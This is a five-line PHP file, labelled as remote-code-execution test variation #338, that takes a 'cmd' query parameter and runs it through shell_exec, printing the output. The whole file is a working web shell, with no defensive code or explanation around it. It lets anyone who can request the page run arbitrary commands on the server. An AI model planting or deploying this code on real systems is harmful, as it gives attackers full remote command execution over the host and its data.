<?php
// RCE test variation #338
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>